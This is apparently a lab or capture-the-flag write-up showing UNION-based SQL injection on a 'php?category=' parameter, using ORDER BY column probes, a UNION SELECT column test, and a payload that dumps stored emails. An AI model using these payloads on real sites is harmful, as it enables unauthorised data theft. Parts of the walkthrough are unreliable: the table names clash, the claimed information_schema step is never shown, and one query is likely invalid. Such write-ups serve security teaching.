# üõ† Challenge Description

In this challenge, we discovered a web application vulnerable to **SQL Injection (SQLi)**.  
Our task was to explore the database and extract sensitive information (such as email addresses) from a **dummy table** in a controlled environment.  

---

## üéØ Goal

Retrieve data (e.g., email IDs) from the database using SQL Injection techniques.  

---

## üß† Step-by-Step Approach

### 1. Exploring the Web Application
- The website had a login form and product categories.  
- A parameter like `php?category=4` controlled which product category was displayed.  
- This hinted that user input might be directly used in SQL queries.

### 2. Testing for SQL Injection with `ORDER BY`
We need to check how many columns the SQL query has.

Examples:  
```sql
php?category=4 ORDER BY 1   -- Works
php?category=4 ORDER BY 2   -- Works
php?category=4 ORDER BY 3   -- Works
php?category=4 ORDER BY 5   -- Error (no output)
```

---

### 3. Confirming with UNION SELECT
We test which columns reflect output using:  

```sql
php?category=4 UNION ALL SELECT 1,2,3,4
```

‚û°Ô∏è The page displayed some values (like 2 or 3), confirming which columns were visible.  

---



### 4. Retrieving the Target Data
Finally, to dump emails from the `users` table:  

```sql
php?category=2 UNION ALL SELECT NULL, *, NULL, NULL FROM email; 
or
php?category=2 union all select null,null,*,null from tablename;
```

‚û°Ô∏è The page displayed the stored dummy email addresses.  

---

## ‚úÖ Result

We successfully extracted the email field from the `email` table in this lab environment.  

**Key Takeaways:**  
- Used `ORDER BY` to find column count.  
- Used `UNION SELECT` to identify injectable columns.  
- Enumerated tables/columns with `information_schema`.  
- Retrieved target data safely in a controlled setting.
